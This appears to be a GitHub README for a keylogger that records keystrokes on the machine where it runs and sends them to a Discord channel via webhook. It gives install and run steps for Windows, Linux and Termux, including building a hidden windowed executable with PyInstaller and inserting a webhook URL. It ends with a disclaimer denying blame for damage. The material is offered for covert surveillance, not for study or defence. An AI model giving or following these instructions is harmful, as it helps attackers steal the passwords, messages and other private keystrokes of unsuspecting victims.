# webhook-keyloger-vicuncil
This script is designed to log keystrokes on the computer where it's executed and send those keystrokes to a Discord channel via a webhook.

-------------------------------------------------------------------------------------------
WIndows
-------------------------------------------------------------------------------------------

Download as zip
open cmd 
go to directory
python script.py
if you want to make executable file 
python -m Pyinstaller --onefile --windowed --icon=devil.ico script.py 
after that is gonna create folder in directory with name "dist" and there is script.exe 

------------------------------------------------------------------------------------------
Linux
------------------------------------------------------------------------------------------
open terminal 
sudo apt install git
git clone https://github.com/vicuncil/webhook-keyloger-vicuncil
cd webhook-keyloger-vicuncil
nano script.py
go to line 8 and post your webhook
after that CTRL+ X
hit Y
CTRL+ M
sudo apt install python & python3
python3 script.py

----------------------------------------------------------------
Termux
---------------------------------------------------------------
pkg install git -y 
pkg install python & python3
pkg update
pkg upgrade
git clone https://github.com/vicuncil/webhook-keyloger-vicuncil
cd webhook-keyloger-vicuncil
nano script.py
go to line 8 and post your webhook
after that CTRL+ X
hit Y
CTRL+ M
python3 script.py

--------------------------------------------------------------
If someone module is missing type:  
-----------------------------------------------------------------------------

pip install requests
pip install pynput
pip3 install requests pynput

----------------------------------------------------------------
⚠️Disclaimer: This script bears no blame for the damage it causes⚠️
----------------------------------------------------------------------

